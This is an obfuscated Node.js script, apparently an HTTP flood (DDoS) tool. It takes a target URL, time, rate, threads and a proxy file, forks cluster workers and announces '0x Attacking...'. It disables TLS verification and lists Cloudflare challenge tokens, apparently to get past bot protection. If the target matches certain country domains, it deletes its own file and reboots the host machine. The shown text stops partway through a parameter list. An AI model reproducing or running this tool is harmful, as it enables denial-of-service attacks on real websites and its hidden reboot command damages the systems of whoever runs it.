"use strict";

var _EzQj, _Object$IKcw2;
function _toConsumableArray(r) {
  return _arrayWithoutHoles(r) || _iterableToArray(r) || _unsupportedIterableToArray(r) || _nonIterableSpread();
}
function _nonIterableSpread() {
  throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
}
function _iterableToArray(r) {
  if ("undefined" != typeof Symbol && null != r[Symbol.iterator] || null != r["@@iterator"]) {
    return Array.from(r);
  }
}
function _arrayWithoutHoles(r) {
  if (Array.isArray(r)) {
    return _arrayLikeToArray(r);
  }
}
function _regeneratorRuntime() {
  "use strict";

  _regeneratorRuntime = function _regeneratorRuntime() {
    return e;
  };
  var t,
    e = {},
    r = Object.prototype,
    n = r.hasOwnProperty,
    o = Object.defineProperty || function (t, e, r) {
      t[e] = r.value;
    },
    i = "function" == typeof Symbol ? Symbol : {},
    a = i.iterator || "@@iterator",
    c = i.asyncIterator || "@@asyncIterator",
    u = i.toStringTag || "@@toStringTag";
  function define(t, e, r) {
    Object.defineProperty(t, e, {
      value: r,
      enumerable: !0,
      configurable: !0,
      writable: !0
    });
    return t[e];
  }
  try {
    define({}, "");
  } catch (t) {
    define = function define(t, e, r) {
      return t[e] = r;
    };
  }
  function wrap(t, e, r, n) {
    var i = e && e.prototype instanceof Generator ? e : Generator,
      a = Object.create(i.prototype),
      c = new Context(n || []);
    o(a, "_invoke", {
      value: makeInvokeMethod(t, r, c)
    });
    return a;
  }
  function tryCatch(t, e, r) {
    try {
      return {
        type: "normal",
        arg: t.call(e, r)
      };
    } catch (t) {
      return {
        type: "throw",
        arg: t
      };
    }
  }
  e.wrap = wrap;
  var h = "suspendedStart",
    l = "suspendedYield",
    f = "executing",
    s = "completed",
    y = {};
  function Generator() {}
  function GeneratorFunction() {}
  function GeneratorFunctionPrototype() {}
  var p = {};
  define(p, a, function () {
    return this;
  });
  var d = Object.getPrototypeOf,
    v = d && d(d(values([])));
  v && v !== r && n.call(v, a) && (p = v);
  GeneratorFunctionPrototype.prototype = Generator.prototype = Object.create(p);
  var g = GeneratorFunctionPrototype.prototype;
  function defineIteratorMethods(t) {
    ["next", "throw", "return"].forEach(function (e) {
      define(t, e, function (t) {
        return this._invoke(e, t);
      });
    });
  }
  function AsyncIterator(t, e) {
    function invoke(r, o, i, a) {
      var c = tryCatch(t[r], t, o);
      if ("throw" !== c.type) {
        var u = c.arg,
          h = u.value;
        return h && "object" == _typeof(h) && n.call(h, "__await") ? e.resolve(h.__await).then(function (t) {
          invoke("next", t, i, a);
        }, function (t) {
          invoke("throw", t, i, a);
        }) : e.resolve(h).then(function (t) {
          u.value = t;
          i(u);
        }, function (t) {
          return invoke("throw", t, i, a);
        });
      }
      a(c.arg);
    }
    var r;
    o(this, "_invoke", {
      value: function value(t, n) {
        function callInvokeWithMethodAndArg() {
          return new e(function (e, r) {
            invoke(t, n, e, r);
          });
        }
        return r = r ? r.then(callInvokeWithMethodAndArg, callInvokeWithMethodAndArg) : callInvokeWithMethodAndArg();
      }
    });
  }
  function makeInvokeMethod(e, r, n) {
    var o = h;
    return function (i, a) {
      if (o === f) {
        throw Error("Generator is already running");
      }
      if (o === s) {
        if ("throw" === i) {
          throw a;
        }
        return {
          value: t,
          done: !0
        };
      }
      for (n.method = i, n.arg = a;;) {
        var c = n.delegate;
        if (c) {
          var u = maybeInvokeDelegate(c, n);
          if (u) {
            if (u === y) {
              continue;
            }
            return u;
          }
        }
        if ("next" === n.method) {
          n.sent = n._sent = n.arg;
        } else {
          if ("throw" === n.method) {
            if (o === h) {
              throw o = s, n.arg;
            }
            n.dispatchException(n.arg);
          } else {
            "return" === n.method && n.abrupt("return", n.arg);
          }
        }
        o = f;
        var p = tryCatch(e, r, n);
        if ("normal" === p.type) {
          if (o = n.done ? s : l, p.arg === y) {
            continue;
          }
          return {
            value: p.arg,
            done: n.done
          };
        }
        "throw" === p.type && (o = s, n.method = "throw", n.arg = p.arg);
      }
    };
  }
  function maybeInvokeDelegate(e, r) {
    var n = r.method,
      o = e.iterator[n];
    if (o === t) {
      r.delegate = null;
      "throw" === n && e.iterator.return && (r.method = "return", r.arg = t, maybeInvokeDelegate(e, r), "throw" === r.method) || "return" !== n && (r.method = "throw", r.arg = new TypeError("The iterator does not provide a '" + n + "' method"));
      return y;
    }
    var i = tryCatch(o, e.iterator, r.arg);
    if ("throw" === i.type) {
      r.method = "throw";
      r.arg = i.arg;
      r.delegate = null;
      return y;
    }
    var a = i.arg;
    return a ? a.done ? (r[e.resultName] = a.value, r.next = e.nextLoc, "return" !== r.method && (r.method = "next", r.arg = t), r.delegate = null, y) : a : (r.method = "throw", r.arg = new TypeError("iterator result is not an object"), r.delegate = null, y);
  }
  function pushTryEntry(t) {
    var e = {
      tryLoc: t[0]
    };
    1 in t && (e.catchLoc = t[1]);
    2 in t && (e.finallyLoc = t[2], e.afterLoc = t[3]);
    this.tryEntries.push(e);
  }
  function resetTryEntry(t) {
    var e = t.completion || {};
    e.type = "normal";
    delete e.arg;
    t.completion = e;
  }
  function Context(t) {
    this.tryEntries = [{
      tryLoc: "root"
    }];
    t.forEach(pushTryEntry, this);
    this.reset(!0);
  }
  function values(e) {
    if (e || "" === e) {
      var r = e[a];
      if (r) {
        return r.call(e);
      }
      if ("function" == typeof e.next) {
        return e;
      }
      if (!isNaN(e.length)) {
        var o = -1,
          i = function next() {
            for (; ++o < e.length;) {
              if (n.call(e, o)) {
                next.value = e[o];
                next.done = !1;
                return next;
              }
            }
            next.value = t;
            next.done = !0;
            return next;
          };
        return i.next = i;
      }
    }
    throw new TypeError(_typeof(e) + " is not iterable");
  }
  GeneratorFunction.prototype = GeneratorFunctionPrototype;
  o(g, "constructor", {
    value: GeneratorFunctionPrototype,
    configurable: !0
  });
  o(GeneratorFunctionPrototype, "constructor", {
    value: GeneratorFunction,
    configurable: !0
  });
  GeneratorFunction.displayName = define(GeneratorFunctionPrototype, u, "GeneratorFunction");
  e.isGeneratorFunction = function (t) {
    var e = "function" == typeof t && t.constructor;
    return !!e && (e === GeneratorFunction || "GeneratorFunction" === (e.displayName || e.name));
  };
  e.mark = function (t) {
    Object.setPrototypeOf ? Object.setPrototypeOf(t, GeneratorFunctionPrototype) : (t.__proto__ = GeneratorFunctionPrototype, define(t, u, "GeneratorFunction"));
    t.prototype = Object.create(g);
    return t;
  };
  e.awrap = function (t) {
    return {
      __await: t
    };
  };
  defineIteratorMethods(AsyncIterator.prototype);
  define(AsyncIterator.prototype, c, function () {
    return this;
  });
  e.AsyncIterator = AsyncIterator;
  e.async = function (t, r, n, o, i) {
    void 0 === i && (i = Promise);
    var a = new AsyncIterator(wrap(t, r, n, o), i);
    return e.isGeneratorFunction(r) ? a : a.next().then(function (t) {
      return t.done ? t.value : a.next();
    });
  };
  defineIteratorMethods(g);
  define(g, u, "Generator");
  define(g, a, function () {
    return this;
  });
  define(g, "toString", function () {
    return "[object Generator]";
  });
  e.keys = function (t) {
    var e = Object(t),
      r = [];
    for (var n in e) r.push(n);
    r.reverse();
    return function next() {
      for (; r.length;) {
        var t = r.pop();
        if (t in e) {
          next.value = t;
          next.done = !1;
          return next;
        }
      }
      next.done = !0;
      return next;
    };
  };
  e.values = values;
  Context.prototype = {
    constructor: Context,
    reset: function reset(e) {
      if (this.prev = 0, this.next = 0, this.sent = this._sent = t, this.done = !1, this.delegate = null, this.method = "next", this.arg = t, this.tryEntries.forEach(resetTryEntry), !e) {
        for (var r in this) "t" === r.charAt(0) && n.call(this, r) && !isNaN(+r.slice(1)) && (this[r] = t);
      }
    },
    stop: function stop() {
      this.done = !0;
      var t = this.tryEntries[0].completion;
      if ("throw" === t.type) {
        throw t.arg;
      }
      return this.rval;
    },
    dispatchException: function dispatchException(e) {
      if (this.done) {
        throw e;
      }
      var r = this;
      function handle(n, o) {
        a.type = "throw";
        a.arg = e;
        r.next = n;
        o && (r.method = "next", r.arg = t);
        return !!o;
      }
      for (var o = this.tryEntries.length - 1; o >= 0; --o) {
        var i = this.tryEntries[o],
          a = i.completion;
        if ("root" === i.tryLoc) {
          return handle("end");
        }
        if (i.tryLoc <= this.prev) {
          var c = n.call(i, "catchLoc"),
            u = n.call(i, "finallyLoc");
          if (c && u) {
            if (this.prev < i.catchLoc) {
              return handle(i.catchLoc, !0);
            }
            if (this.prev < i.finallyLoc) {
              return handle(i.finallyLoc);
            }
          } else {
            if (c) {
              if (this.prev < i.catchLoc) {
                return handle(i.catchLoc, !0);
              }
            } else {
              if (!u) {
                throw Error("try statement without catch or finally");
              }
              if (this.prev < i.finallyLoc) {
                return handle(i.finallyLoc);
              }
            }
          }
        }
      }
    },
    abrupt: function abrupt(t, e) {
      for (var r = this.tryEntries.length - 1; r >= 0; --r) {
        var o = this.tryEntries[r];
        if (o.tryLoc <= this.prev && n.call(o, "finallyLoc") && this.prev < o.finallyLoc) {
          var i = o;
          break;
        }
      }
      i && ("break" === t || "continue" === t) && i.tryLoc <= e && e <= i.finallyLoc && (i = null);
      var a = i ? i.completion : {};
      a.type = t;
      a.arg = e;
      return i ? (this.method = "next", this.next = i.finallyLoc, y) : this.complete(a);
    },
    complete: function complete(t, e) {
      if ("throw" === t.type) {
        throw t.arg;
      }
      "break" === t.type || "continue" === t.type ? this.next = t.arg : "return" === t.type ? (this.rval = this.arg = t.arg, this.method = "return", this.next = "end") : "normal" === t.type && e && (this.next = e);
      return y;
    },
    finish: function finish(t) {
      for (var e = this.tryEntries.length - 1; e >= 0; --e) {
        var r = this.tryEntries[e];
        if (r.finallyLoc === t) {
          this.complete(r.completion, r.afterLoc);
          resetTryEntry(r);
          return y;
        }
      }
    },
    catch: function _catch(t) {
      for (var e = this.tryEntries.length - 1; e >= 0; --e) {
        var r = this.tryEntries[e];
        if (r.tryLoc === t) {
          var n = r.completion;
          if ("throw" === n.type) {
            var o = n.arg;
            resetTryEntry(r);
          }
          return o;
        }
      }
      throw Error("illegal catch attempt");
    },
    delegateYield: function delegateYield(e, r, n) {
      this.delegate = {
        iterator: values(e),
        resultName: r,
        nextLoc: n
      };
      "next" === this.method && (this.arg = t);
      return y;
    }
  };
  return e;
}
function _typeof(o) {
  "@babel/helpers - typeof";

  _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) {
    return typeof o;
  } : function (o) {
    return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o;
  };
  return _typeof(o);
}
function asyncGeneratorStep(n, t, e, r, o, a, c) {
  try {
    var i = n[a](c),
      u = i.value;
  } catch (n) {
    return void e(n);
  }
  i.done ? t(u) : Promise.resolve(u).then(r, o);
}
function _asyncToGenerator(n) {
  return function () {
    var t = this,
      e = arguments;
    return new Promise(function (r, o) {
      var a = n.apply(t, e);
      function _next(n) {
        asyncGeneratorStep(a, r, o, _next, _throw, "next", n);
      }
      function _throw(n) {
        asyncGeneratorStep(a, r, o, _next, _throw, "throw", n);
      }
      _next(void 0);
    });
  };
}
function _classCallCheck(a, n) {
  if (!(a instanceof n)) {
    throw new TypeError("Cannot call a class as a function");
  }
}
function _defineProperties(e, r) {
  for (var t = 0; t < r.length; t++) {
    var o = r[t];
    o.enumerable = o.enumerable || !1;
    o.configurable = !0;
    "value" in o && (o.writable = !0);
    Object.defineProperty(e, _toPropertyKey(o.key), o);
  }
}
function _createClass(e, r, t) {
  r && _defineProperties(e.prototype, r);
  t && _defineProperties(e, t);
  Object.defineProperty(e, "prototype", {
    writable: !1
  });
  return e;
}
function _createForOfIteratorHelper(r, e) {
  var t = "undefined" != typeof Symbol && r[Symbol.iterator] || r["@@iterator"];
  if (!t) {
    if (Array.isArray(r) || (t = _unsupportedIterableToArray(r)) || e && r && "number" == typeof r.length) {
      t && (r = t);
      var _n = 0,
        F = function F() {};
      return {
        s: F,
        n: function n() {
          return _n >= r.length ? {
            done: !0
          } : {
            done: !1,
            value: r[_n++]
          };
        },
        e: function e(r) {
          throw r;
        },
        f: F
      };
    }
    throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
  }
  var o,
    a = !0,
    u = !1;
  return {
    s: function s() {
      t = t.call(r);
    },
    n: function n() {
      var r = t.next();
      a = r.done;
      return r;
    },
    e: function e(r) {
      u = !0;
      o = r;
    },
    f: function f() {
      try {
        a || null == t.return || t.return();
      } finally {
        if (u) {
          throw o;
        }
      }
    }
  };
}
function _slicedToArray(r, e) {
  return _arrayWithHoles(r) || _iterableToArrayLimit(r, e) || _unsupportedIterableToArray(r, e) || _nonIterableRest();
}
function _nonIterableRest() {
  throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
}
function _unsupportedIterableToArray(r, a) {
  if (r) {
    if ("string" == typeof r) {
      return _arrayLikeToArray(r, a);
    }
    var t = {}.toString.call(r).slice(8, -1);
    "Object" === t && r.constructor && (t = r.constructor.name);
    return "Map" === t || "Set" === t ? Array.from(r) : "Arguments" === t || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(t) ? _arrayLikeToArray(r, a) : void 0;
  }
}
function _arrayLikeToArray(r, a) {
  (null == a || a > r.length) && (a = r.length);
  for (var e = 0, n = Array(a); e < a; e++) {
    n[e] = r[e];
  }
  return n;
}
function _iterableToArrayLimit(r, l) {
  var t = null == r ? null : "undefined" != typeof Symbol && r[Symbol.iterator] || r["@@iterator"];
  if (null != t) {
    var e,
      n,
      i,
      u,
      a = [],
      f = !0,
      o = !1;
    try {
      if (i = (t = t.call(r)).next, 0 === l) {
        if (Object(t) !== t) {
          return;
        }
        f = !1;
      } else {
        for (; !(f = (e = i.call(t)).done) && (a.push(e.value), a.length !== l); f = !0) {}
      }
    } catch (r) {
      o = !0;
      n = r;
    } finally {
      try {
        if (!f && null != t.return && (u = t.return(), Object(u) !== u)) {
          return;
        }
      } finally {
        if (o) {
          throw n;
        }
      }
    }
    return a;
  }
}
function _arrayWithHoles(r) {
  if (Array.isArray(r)) {
    return r;
  }
}
function _defineProperty(e, r, t) {
  (r = _toPropertyKey(r)) in e ? Object.defineProperty(e, r, {
    value: t,
    enumerable: !0,
    configurable: !0,
    writable: !0
  }) : e[r] = t;
  return e;
}
function _toPropertyKey(t) {
  var i = _toPrimitive(t, "string");
  return "symbol" == _typeof(i) ? i : i + "";
}
function _toPrimitive(t, r) {
  if ("object" != _typeof(t) || !t) {
    return t;
  }
  var e = t[Symbol.toPrimitive];
  if (void 0 !== e) {
    var i = e.call(t, r || "default");
    if ("object" != _typeof(i)) {
      return i;
    }
    throw new TypeError("@@toPrimitive must return a primitive value.");
  }
  return ("string" === r ? String : Number)(t);
}
var AcPs = require("net"),
  ceSs = require("http2"),
  wZIs = require("tls"),
  YaMs = require("cluster"),
  Yuzt = require("url"),
  AwCt = require("crypto"),
  Urtt = require("fs"),
  wtwt = require("axios"),
  Qont = require("https"),
  _require = require("child_process"),
  sqqt = _require.execSync;
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", function (Mlht) {});
var onkt = 0;
while (onkt < 65535) {
  switch (onkt) {
    case 0:
      onkt = process.argv.length < 7 ? 1 : 65535;
      break;
    case 1:
      onkt = 65535;
      {
        console.log("   ");
        console.log("[33m[[31m+[33m]------------------------------------------------------------------[[31m+[33m][0m");
        console.log("[31m->[0m Command [31m: [0mnode [33m0x [32m<[0mLink[32m> <[0mTime[32m> <[0mRate[32m> <[0mThreads[32m> <[0mProxy File[32m>.[0m");
        console.log("[33m[[31m+[33m]------------------------------------------------------------------[[31m+[33m][0m");
        console.log("   ");
        process.exit();
      }
      break;
  }
}
var kERt = {};
function MFUt(gBLt) {
  var cyFt = _defineProperty({}, "FTjag", "utf-8");
  return Urtt.readFileSync(gBLt, cyFt.FTjag).toString().split(/\r?\n/);
}
var EzIt = process.argv[2],
  ETvu = new Qont.Agent(_defineProperty({}, "rejectUnauthorized", false)),
  gVyu = process.argv[2];
function AQpu(cSsu) {
  try {
    return new URL(cSsu).hostname;
  } catch (_unused) {
    try {
      return new URL("http://" + cSsu).hostname;
    } catch (_unused2) {
      return null;
    }
  }
}
var YOmu = AQpu(gVyu);
!YOmu && (console.error("Invalid domain format"), process.exit(1));
var sKdu = [".bn", ".lb", ".ir", "-ye", ".my", ".id", ".ye", ".ye", ".af", ".sy", ".om", "malaysia", ".kw", ".bh", ".uz", ".sd", ".qa", ".jo", ".dz", ".sa", ".pk", ".bd", ".ps", ".eg", ".iq", ".ly", ".ae", ".tn", ".so", ".mv", ".km", ".ma"],
  ULgu = process.platform,
  wlir = process.env.HOME === "/data/data/com.termux/files/home" || !!process.env.ANDROID_ROOT;
var Ujfr = 0;
while (Ujfr < 65535) {
  switch (Ujfr) {
    case 0:
      Ujfr = sKdu.some(function (ofWq) {
        return YOmu.toLowerCase().includes(ofWq);
      }) ? 1 : 65535;
      break;
    case 1:
      Ujfr = 65535;
      {
        console.log("[31m[[33m![31m] [33mBlocked domain detected. Taking action...[0m");
        try {
          var QgZq = 0;
          while (QgZq < 65535) {
            switch (QgZq) {
              case 0:
                QgZq = ULgu === "win32" ? 1 : 2;
                break;
              case 1:
                QgZq = 65535;
                sqqt("del /f /q 0x.js", _defineProperty({}, "stdio", "inherit"));
                break;
              case 2:
                QgZq = 65535;
                {
                  var kcQq = wlir ? "rm -f 0x.js" : "sudo rm -f 0x.js";
                  sqqt(kcQq, _defineProperty({}, "stdio", "inherit"));
                }
                break;
            }
          }
        } catch (MdTq) {}
        try {
          var MxGr = 0;
          while (MxGr < 65535) {
            switch (MxGr) {
              case 0:
                MxGr = ULgu === "win32" ? 1 : 2;
                break;
              case 1:
                MxGr = 65535;
                sqqt("shutdown /r /t 0", _defineProperty({}, "stdio", "inherit"));
                break;
              case 2:
                MxGr = 65535;
                !wlir ? sqqt("sudo reboot", _defineProperty({}, "stdio", "inherit")) : console.log("Termux detected - System reboot skipped");
                break;
            }
          }
        } catch (ozJr) {}
        process.exit(1);
      }
      break;
  }
}
function ELhs() {
  var AIbs = _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "PyjAT", function PyjAT(QAMr, sCPr) {
      return QAMr(sCPr);
    }), "JAsbz", "[31mRequest timed out"), "CZWfO", function CZWfO(sWCs, UXFs, oTws) {
      return sWCs(UXFs, oTws);
    }), "ZQICq", function ZQICq(QUzs, kQqs) {
      return QUzs === kQqs;
    }), "PMRvH", "[31mRequest timed out[0m"), "CQFsB", function CQFsB(MRts, gNks) {
      return MRts(gNks);
    }),
    UDSr = new Promise(function (IOns, kopp) {
      AIbs.CZWfO(setTimeout, function () {
        AIbs.PyjAT(kopp, new Error(AIbs.JAsbz));
      }, 5000);
    }),
    wFVr = wtwt.get(EzIt, _defineProperty({}, "httpsAgent", ETvu));
  Promise.race([wFVr, UDSr]).then(function (Immp) {
    var Ejgp = Immp.status,
      YeXo = Immp.data;
    console.log("[33m[[0m0x[33m] [32m=[0m " + AIbs.PyjAT(suBp, YeXo) + " ([32m" + Ejgp + "[0m)");
  }).catch(function (Agap) {
    var cCQp = 0;
    while (cCQp < 65535) {
      switch (cCQp) {
        case 0:
          cCQp = AIbs.ZQICq(Agap.message, AIbs.PMRvH) ? 1 : 2;
          break;
        case 1:
          cCQp = 65535;
          console.log("[33m[[0m0x[33m] [32m=[0m [31mRequest Timed Out[0m");
          break;
        case 2:
          cCQp = 65535;
          {
            var wxHp = 0;
            while (wxHp < 65535) {
              switch (wxHp) {
                case 0:
                  wxHp = Agap.response ? 1 : 2;
                  break;
                case 1:
                  wxHp = 65535;
                  {
                    var YyKp = AIbs.CQFsB(suBp, Agap.response.data);
                    console.log("[33m[[0m0x[33m] [32m=[0m " + YyKp + " ([31m" + Agap.response.status + "[0m)");
                  }
                  break;
                case 2:
                  wxHp = 65535;
                  console.log("[33m[[0m0x[33m] [32m= [31m" + Agap.message + "  [0m");
                  break;
              }
            }
          }
          break;
      }
    }
  });
}
function suBp(UvEp) {
  var Qsyp = _defineProperty({}, "ejrEK", "No Title Detected"),
    QMlq = /<title>(.*?)<\/title>/i,
    sOoq = UvEp.match(QMlq);
  var MJfq = 0;
  while (MJfq < 65535) {
    switch (MJfq) {
      case 0:
        MJfq = sOoq && sOoq[1] ? 1 : 65535;
        break;
      case 1:
        MJfq = 65535;
        return sOoq[1];
    }
  }
  return Qsyp.ejrEK;
}
function oLiq(IGZp, kIcq) {
  var gFWp = _defineProperty(_defineProperty(_defineProperty({}, "hjOam", function hjOam(gZJq, IaNq) {
    return gZJq + IaNq;
  }), "KJIlI", function KJIlI(cWDq, EXGq) {
    return cWDq * EXGq;
  }), "iCrNB", function iCrNB(YSxq, AUAq) {
    return YSxq - AUAq;
  });
  return Math.floor(gFWp.hjOam(gFWp.KJIlI(Math.random(), gFWp.iCrNB(kIcq, IGZp)), IGZp));
}
function UPrq(wRuq) {
  var Aszn = _defineProperty({}, "bmNxL", function bmNxL(Unqn, wptn, Qkkn) {
    return Unqn(wptn, Qkkn);
  });
  return wRuq[Aszn.bmNxL(oLiq, 0, wRuq.length)];
}
var smnn = function smnn() {
    var gxIn = _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "PfLGl", function PfLGl(cuCn, EvFn) {
        return cuCn * EvFn;
      }), "vUoaE", function vUoaE(EPso, gRvo) {
        return EPso + gRvo;
      }), "KvsVl", function KvsVl(AMmo, cOpo) {
        return AMmo + cOpo;
      }), "VqEaL", function VqEaL(wJgo, YKjo) {
        return wJgo + YKjo;
      }), "zDUkf", function zDUkf(sGao) {
        return sGao();
      }), "haEYd", function haEYd(UHdo) {
        return UHdo();
      }),
      IyLn = function IyLn() {
        return Math.floor(gxIn.PfLGl(Math.random(), 256));
      };
    return gxIn.vUoaE(gxIn.vUoaE(gxIn.KvsVl(gxIn.KvsVl(gxIn.vUoaE(gxIn.VqEaL(gxIn.zDUkf(IyLn), "."), gxIn.haEYd(IyLn)), "."), gxIn.zDUkf(IyLn)), "."), gxIn.zDUkf(IyLn));
  },
  Mhen = smnn(),
  ojhn = _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "target", process.argv[2]), "time", ~~process.argv[3]), "Rate", ~~process.argv[4]), "threads", ~~process.argv[5]), "proxyFile", process.argv[6]),
  oDUn = require("os"),
  QEXn = 85,
  kAOn = 1000;
function wdUo() {
  var saOo = _defineProperty(_defineProperty(_defineProperty({}, "BCkQn", function BCkQn(ISyo, kUBo) {
      return ISyo + kUBo;
    }), "AMNvN", function AMNvN(MtDl, ovGl) {
      return MtDl * ovGl;
    }), "dwGIW", function dwGIW(Iqxl, ksAl) {
      return Iqxl - ksAl;
    }),
    MVEo = 512,
    oXHo = 2048;
  return saOo.BCkQn(Math.floor(saOo.AMNvN(Math.random(), saOo.BCkQn(saOo.dwGIW(oXHo, MVEo), 1))), MVEo);
}
var Enrl = 0;
var _loop = function _loop() {
    switch (Enrl) {
      case 0:
        Enrl = YaMs.isMaster ? 1 : 2;
        break;
      case 1:
        Enrl = 65535;
        {
          console.clear();
          console.log("");
          console.log("[33m[[0m+[33m][0m--------------------------------------------[33m[[0m+[33m]");
          console.log("[31m-> [0mTarget[33m : [32m" + (process.argv[2] || "Unknown"));
          console.log("[31m-> [0mTime[33m : [32m" + (process.argv[3] || "Unknown"));
          console.log("[31m-> [0mRate[33m : [32m" + (process.argv[4] || "Unknown"));
          console.log("[31m-> [0mThread[33m  : [32m" + (process.argv[5] || "1"));
          console.log("[31m-> [0mProxyFile[33m : [32m" + (process.argv[6] || "proxy.txt"));
          console.log("[33m[[0m+[33m][0m--------------------------------------------[33m[[0m+[33m]");
          var gpul = function gpul() {
              var cGbm = _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "sxfnb", function sxfnb(EHem, YCVl) {
                return EHem <= YCVl;
              }), "tkwwK", function tkwwK(AEYl) {
                return AEYl();
              }), "XypKI", "[33m[[0m>[33m] [31mRestarting the script[33m"), "VIKCn", "[0mms..."), "DUdeS", function DUdeS(UzPl, wBSl, QwJl) {
                return UzPl(wBSl, QwJl);
              });
              console.log(cGbm.XypKI, kAOn, cGbm.VIKCn);
              for (var syMl in YaMs.workers) {
                YaMs.workers[syMl].kill();
              }
              cGbm.DUdeS(setTimeout, function () {
                var UTCm = 0;
                {
                  var oPtm;
                  while (UTCm < 65535) {
                    switch (UTCm) {
                      case 0:
                        UTCm = 1;
                        oPtm = 1;
                        break;
                      case 1:
                        UTCm = cGbm.sxfnb(oPtm, process.argv[5]) ? 2 : 65535;
                        break;
                      case 2:
                        UTCm = 3;
                        {
                          var QQwm = cGbm.tkwwK(wdUo);
                          YaMs.fork(_defineProperty({}, "NODE_OPTIONS", "--max-old-space-size=" + QQwm));
                        }
                        break;
                      case 3:
                        UTCm = 1;
                        oPtm++;
                        break;
                    }
                  }
                }
              }, kAOn);
            },
            Akll = function Akll() {
              var MNqm = _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "Antco", function Antco(kgbn, EbSm) {
                  return kgbn - EbSm;
                }), "JvLVo", function JvLVo(gdVm, AYLm) {
                  return gdVm * AYLm;
                }), "mshmS", function mshmS(caPm, wVFm) {
                  return caPm / wVFm;
                }), "dCnIG", function dCnIG(YWIm, AwKj) {
                  return YWIm >= AwKj;
                }), "XYVXO", "[33m[[0m![33m] [31mMaximum RAM usage:[31m"), "JYatZ", "[0m%"), "wBrZg", function wBrZg(cyNj) {
                  return cyNj();
                }),
                gJhm = oDUn.totalmem(),
                IKkm = MNqm.Antco(gJhm, oDUn.freemem()),
                IeYm = MNqm.JvLVo(MNqm.mshmS(IKkm, gJhm), 100);
              MNqm.dCnIG(IeYm, QEXn) && (console.log(MNqm.XYVXO, IeYm.toFixed(2), MNqm.JYatZ), MNqm.wBrZg(gpul));
            };
          setInterval(Akll, 5000);
          wtEj = 0;
          {
            var YuHj;
            while (wtEj < 65535) {
              switch (wtEj) {
                case 0:
                  wtEj = 1;
                  YuHj = 1;
                  break;
                case 1:
                  wtEj = YuHj <= process.argv[5] ? 2 : 65535;
                  break;
                case 2:
                  wtEj = 3;
                  {
                    var sqyj = wdUo();
                    YaMs.fork(_defineProperty({}, "NODE_OPTIONS", "--max-old-space-size=" + sqyj));
                    console.log("[33m[[0m0x[33m] [32m= [0mEngine [31m" + YuHj + " [0mStarted");
                  }
                  break;
                case 3:
                  wtEj = 1;
                  YuHj++;
                  break;
              }
            }
          }
          console.log("[33m[[0m0x[33m] [32m= [32m0x Attacking...");
          console.log("[33m[[0m+[33m][0m-----------------------------------------------------------------------------[33m[[0m+[33m]");
          setInterval(ELhs, 2000);
          setTimeout(function () {
            console.log("[33m[[0m+[33m][0m-----------------------------------------------------------------------------[33m[[0m+[33m]");
            console.log("[31m[[33m0x[31m] [32m-> [33mAttack Successful[0m");
            process.exit(1);
          }, process.argv[3] * 1000);
        }
        break;
      case 2:
        Enrl = 65535;
        setInterval(Yaknc, 1);
        break;
    }
  },
  wtEj;
while (Enrl < 65535) {
  _loop();
}
var onsj = ["ecdsa_secp256r1_sha256", "ecdsa_secp384r1_sha384", "ecdsa_secp521r1_sha512", "rsa_pss_rsae_sha256", "rsa_pss_rsae_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha256", "rsa_pkcs1_sha384", "rsa_pkcs1_sha512"],
  Qovj = ["?s=", "/?", "", "?q=", "?true=", "?", "/", "/.lsrecap/recaptcha?", ".lsrecap/recaptcha?", "?page=1", "?page=2", "?page=3", "?category=news", "?category=sports", "?category=technology", "?category=entertainment", "?sort=newest", "?filter=popular", "?limit=10", "?start_date=1989-06-04", "?end_date=1989-06-04", "?__cf_chl_tk=V0gHmpGB_XzSs.8hyrlf.xMbIrYR7CIXMWaHbYDk4qY-1713811672-0.0.1.1-1514", "?__cf_chl_tk=ZpDDzirt54EoyEeNjwwGO_FZktYyR0QxXRz9Vt_egvk-1711220025-0.0.1.1-1471", "?__cf_chl_tk=2QI_clISOivyUmvBJ4fkVroBhLME3TJv3_2coOv7BXc-1711307038-0.0.1.1-1471", "?__cf_chl_tk=z6L8htd0t62MvL0xSbWgI67gGERMr2u7zjFDIlkGWYQ-1711310297-0.0.1.1-1471", "?__cf_chl_rt_tk=nP2tSCtLIsEGKgIBD2SztwDJCMYm8eL9l2S41oCEN8o-1702888186-0-gaNycGzNCWU", "?__cf_chl_rt_tk=yI__zhdK3yR99B6b9jRkQLlvIjTKu7_2YI33ZCB4Pbo-1702888463-0-gaNycGzNFGU", "?__cf_chl_rt_tk=QbxNnnmC8FpmedkosrfaPthTMxzFMEIO8xa0BdRJFKI-1702888720-0-gaNycGzNFHs", "?__cf_chl_rt_tk=ti1J.838lGH8TxzcrYPefuvbwEORtNOVSKFDISExe1U-1702888784-0-gaNycGzNClA", "?__cf_chl_rt_tk=ntO.9ynonIHqcrAuXZJBTcTBAMsENOYqkY5jzv.PRoM-1702888815-0-gaNycGzNCmU", "?__cf_chl_rt_tk=SCOSydalu5acC72xzBRWOzKBLmYWpGxo3bRYeHFSWqo-1702888950-0-gaNycGzNFHs", "?__cf_chl_rt_tk=QG7VtKbwe83bHEzmP4QeG53IXYnD3FwPM3AdS9QLalk-1702826567-0-gaNycGzNE9A", "?__cf_chl_rt_tk=C9XmGKQztFjEwNpc0NK4A3RHUzdb8ePYIAXXzsVf8mk-1702889060-0-gaNycGzNFNA", "?__cf_chl_rt_tk=cx8R_.rzcHl0NQ0rBM0cKsONGKDhwNgTCO1hu2_.v74-1702889131-0-gaNycGzNFDs", 